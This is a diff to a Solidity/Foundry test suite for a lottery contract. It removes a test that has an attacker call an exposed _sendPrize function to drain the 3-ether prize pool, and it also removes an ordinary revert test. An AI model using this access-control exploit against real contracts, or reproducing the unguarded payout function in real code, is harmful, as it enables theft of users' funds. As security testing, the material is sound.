@@ -142,39 +142,6 @@ contract LotterySystemTest is Test {
         );
     }
 
-    function testContractVulnerability() public {
-        lottery.startLottery(1 ether);
-
-        // Users buy tickets
-        vm.startPrank(user1);
-        lottery.buyTicket{value: 1 ether}(1);
-        vm.stopPrank();
-
-        vm.startPrank(user2);
-        lottery.buyTicket{value: 1 ether}(1);
-        vm.stopPrank();
-
-        vm.startPrank(user3);
-        lottery.buyTicket{value: 1 ether}(1);
-        vm.stopPrank();
-
-        // Attacker attempts to exploit the vulnerability
-        vm.startPrank(attacker);
-        uint256 initialAttackerBalance = attacker.balance;
-        lottery._sendPrize(payable(attacker), 3 ether);
-        vm.stopPrank();
-
-        uint256 finalAttackerBalance = attacker.balance;
-        assertEq(
-            finalAttackerBalance,
-            initialAttackerBalance + 3 ether,
-            "Attacker should be able to steal the prize pool"
-        );
-        console.log(
-            "Vulnerability test passed: Attacker was able to exploit the public _sendPrize function"
-        );
-    }
-
     function testStartLotteryRevertIfNotOwner() public {
         vm.prank(user1);
         vm.expectRevert("Only owner can call this function");
@@ -238,20 +205,6 @@ contract LotterySystemTest is Test {
         vm.expectRevert("Lottery is not active");
         console.log(
             "Calling endLottery function when lottery is not active..."
-        );
-        lottery.endLottery(1);
-    }
-
-    function testEndLotteryRevertIfEnded() public {
-        lottery.startLottery(1 ether);
-        vm.prank(user1);
-        lottery.buyTicket{value: 1 ether}(1);
-        vm.prank(owner);
-        vm.warp(block.timestamp + 15 minutes);
-        lottery.endLottery(1);
-        vm.expectRevert("Lottery is not active");
-        console.log(
-            "Calling endLottery function when lottery is still active..."
         );
         lottery.endLottery(1);
     }
